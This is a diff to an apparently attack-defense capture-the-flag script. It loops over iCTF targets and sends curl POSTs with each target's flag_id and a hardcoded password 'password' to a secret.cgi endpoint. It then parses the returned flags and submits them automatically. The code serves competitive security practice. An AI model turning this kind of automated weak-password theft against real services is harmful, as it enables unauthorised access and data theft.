@@ -4,6 +4,7 @@
 from ictf import iCTF
 import os
 import sys
+import commands
 
 argc = len(sys.argv)
 if argc < 2:
@@ -30,6 +31,11 @@ else:
         targets = t.get_targets(elem)
         for target in targets['targets']:
             hostname  = target['hostname']
+            flag_id = target['flag_id']
             port = target['port']
-            command = "curl -X POST {0} {1}:{2}/{3}".format(sys.argv[1],hostname,port,sys.argv[2])
-            os.system(command)
+            command = "curl -X POST --form note_id={0} --form password=password {1}:20003/secret.cgi".format(flag_id, hostname)
+            # command = "curl -X POST {0} {1}:{2}/{3}".format(sys.argv[1],hostname,port,sys.argv[2])
+            status, result = commands.getstatusoutput(command)
+            flag = result.strip().split(",")[0].strip()
+            print flag
+            t.submit_flag([flag])
